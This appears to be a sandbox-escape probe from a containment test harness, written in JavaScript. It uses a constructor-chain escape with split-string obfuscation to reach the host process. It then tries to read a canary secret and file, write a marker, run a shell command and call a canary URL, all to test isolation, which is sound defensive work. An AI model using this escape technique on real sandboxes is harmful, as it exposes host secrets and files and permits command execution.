// Placeholders are filled in by pipeline/probe-inprocess.ts. If the build can get hold of the host's process (the same
// route as escape-process.js) it reads a canary environment variable and a canary file, writes a marker file, runs a
// command and requests the harness's local canary server. A contained build reports { host: false } and does none of it.
function build(k) {
  var global = (0, function () { return this; })();
  var host;
  try { host = global.constructor.constructor('return pro' + 'cess')(); } catch (error) {}
  if (!host) throw new Error('PROBE ' + JSON.stringify({ host: false }));
  var report = { host: true };
  var load = function (name) { return host['getBuiltin' + 'Module'](name); };
  try { report.secretSeen = host.env['__CANARY_ENV__'] || null; } catch (error) { report.secretError = 1; }
  try { report.envKeys = Object.keys(host.env).length; } catch (error) {}
  try { report.fileSeen = load('fs').readFileSync('__CANARY_FILE__', 'utf8').slice(0, 24); } catch (error) { report.fileError = 1; }
  try { load('fs').writeFileSync('__MARKER_DIR__/written-by-build', 'x'); report.wrote = true; } catch (error) { report.wroteError = 1; }
  try { report.command = String(load('child_process').execSync('id -un')).trim(); } catch (error) { report.commandError = 1; }
  try { load('http').get('__CANARY_URL__', function (response) { response.resume(); }).on('error', function () {}); report.requested = true; } catch (error) { report.requestError = 1; }
  throw new Error('PROBE ' + JSON.stringify(report));
}
